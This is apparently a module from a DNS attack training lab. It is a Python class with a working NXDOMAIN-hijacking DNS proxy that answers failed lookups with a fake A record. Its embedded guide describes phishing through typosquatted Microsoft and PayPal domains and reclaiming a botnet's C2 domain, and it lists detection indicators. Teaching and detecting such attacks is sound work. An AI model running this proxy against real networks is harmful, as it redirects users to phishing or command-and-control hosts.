"""
Module 5 – NXDOMAIN Hijacking
===============================
Intercepts failed DNS lookups and returns fake records instead of
NXDOMAIN, redirecting mistyped domains and nonexistent names.
"""

import json
import socket
import threading
import time
from collections import Counter
from datetime import datetime

from modules.base import LabModule
from shared.dns_core import *
from shared.ui import *
from shared.prereqs import check_root


class NxdomainHijackModule(LabModule):
    NAME        = "NXDOMAIN Hijacking"
    DESCRIPTION = "Intercept failed DNS lookups and serve false records"
    MITRE       = "T1584.002 – Compromise Infrastructure: DNS Server"
    DIFFICULTY  = "Beginner"

    GUIDE = """
## Overview
NXDOMAIN hijacking intercepts queries for nonexistent domains and returns
a valid A record instead of NXDOMAIN. ISPs use this commercially to show
"search suggestion" pages. Attackers use it to intercept:

- Mistyped corporate domain names (typosquatting via DNS)
- Internal names that leak externally
- Default browser search behavior on non-HTTPS clients
- Malware C2 domains after takedown (re-registering NX domains)

## Variants

### ISP-Style Wildcard Hijack
Any NXDOMAIN → redirect to search/ad page at 203.0.113.1:
```
gobgle.com   NXDOMAIN  →  203.0.113.1  (ad page)
facbook.com  NXDOMAIN  →  203.0.113.1  (ad page)
```

### Targeted Typosquatting
Only hijack names close to high-value targets:
```
microsooft.com    →  10.0.0.99  (fake O365 login)
paypa1.com        →  10.0.0.99  (fake PayPal)
```

### Post-Takedown C2 Revival
Malware queries a sinkholed/NX C2 domain. Attacker re-registers or
hijacks at resolver level to reclaim the botnet:
```
botnet-c2.evil.com  NXDOMAIN  →  10.0.0.99 (new C2)
```

## Detection Indicators
- NXDOMAIN responses disappear from DNS traffic
- Previously non-resolving names now return valid A records
- SOA record owner for hijacked responses differs from registrar
- TTL values are unusually uniform (all returning same TTL)
"""

    def __init__(self):
        super().__init__()
        self.listen_ip   = "0.0.0.0"
        self.listen_port = 5353
        self.upstream    = "8.8.8.8"
        self.hijack_ip   = "127.0.0.1"
        self._sock       = None
        self._stop       = threading.Event()
        self._log: list[dict] = []
        self._nx_caught  = 0
        self._passed     = 0

    def setup(self) -> bool:
        if not check_root():
            return False
        section("NXDOMAIN Hijacking Configuration")
        self.listen_ip   = ask("Listen IP",          self.listen_ip)
        self.listen_port = int(ask("Listen port",    str(self.listen_port)))
        self.upstream    = ask("Upstream resolver",  self.upstream)
        self.hijack_ip   = ask("Hijack redirect IP", self.hijack_ip)
        success("Setup complete.")
        return True

    def run(self):
        section("Starting NXDOMAIN Hijack Server")
        info(f"Listen   : {self.listen_ip}:{self.listen_port}")
        info(f"Upstream : {self.upstream}")
        info(f"Hijack   : NXDOMAIN → {self.hijack_ip}")
        print()
        warn("This server proxies all DNS but intercepts NXDOMAIN responses.")
        warn("Press Ctrl+C to stop.")
        print()

        self._stop.clear()
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        self._sock.bind((self.listen_ip, self.listen_port))
        success(f"Server UP on {self.listen_ip}:{self.listen_port}")

        t = threading.Thread(target=self._serve_loop, daemon=True)
        t.start()

        section("Live Traffic")
        last = 0
        try:
            while not self._stop.is_set():
                time.sleep(0.3)
                if len(self._log) > last:
                    for e in self._log[last:]:
                        self._print_entry(e)
                    last = len(self._log)
        except KeyboardInterrupt:
            pass

        self._stop.set()
        self._summary()

    def _serve_loop(self):
        while not self._stop.is_set():
            try:
                data, client_addr = self._sock.recvfrom(512)
                threading.Thread(
                    target=self._handle, args=(data, client_addr),
                    daemon=True
                ).start()
            except socket.timeout:
                continue

    def _handle(self, data: bytes, client_addr: tuple):
        # Forward to upstream
        upstream_resp = self._forward(data)
        msg = parse_message(upstream_resp) if upstream_resp else None

        qname = ""
        if msg and msg.questions:
            qname = msg.questions[0]["qname"].lower().rstrip(".")

        was_nx = msg and msg.header["rcode"] == RCODE_NXDOMAIN
        action = "PASS"
        response = upstream_resp or build_nxdomain_response(0, qname)

        if was_nx:
            # Hijack: return a fake A record instead
            txid     = msg.header["txid"]
            response = build_a_response(txid, qname, self.hijack_ip, ttl=300)
            action   = "HIJACKED"
            self._nx_caught += 1
        else:
            self._passed += 1

        self._sock.sendto(response, client_addr)
        self._log.append({
            "ts":     datetime.now().strftime("%H:%M:%S"),
            "client": client_addr[0],
            "qname":  qname or "?",
            "action": action,
            "result": self.hijack_ip if was_nx else "forwarded",
        })

    def _forward(self, data: bytes) -> bytes | None:
        s = DNSSocket(timeout=3.0)
        return s.query(self.upstream, DNS_PORT, data)

    def _print_entry(self, e: dict):
        if e["action"] == "HIJACKED":
            print(f"  {C.DIM}{e['ts']}{C.RESET}  "
                  f"{C.CYAN}{e['client']:<15}{C.RESET}  "
                  f"{e['qname']:<35}  "
                  f"{C.LRED}NXDOMAIN → {self.hijack_ip}{C.RESET}")
        else:
            print(f"  {C.DIM}{e['ts']}{C.RESET}  "
                  f"{C.CYAN}{e['client']:<15}{C.RESET}  "
                  f"{e['qname']:<35}  "
                  f"{C.GRAY}forwarded{C.RESET}")

    def _summary(self):
        section("Summary")
        info(f"Queries proxied  : {self._passed + self._nx_caught}")
        info(f"NXDOMAIN hijacked: {self._nx_caught}")
        info(f"Forwarded cleanly: {self._passed}")

    def teardown(self):
        self._stop.set()
        if self._sock:
            try: self._sock.close()
            except Exception: pass
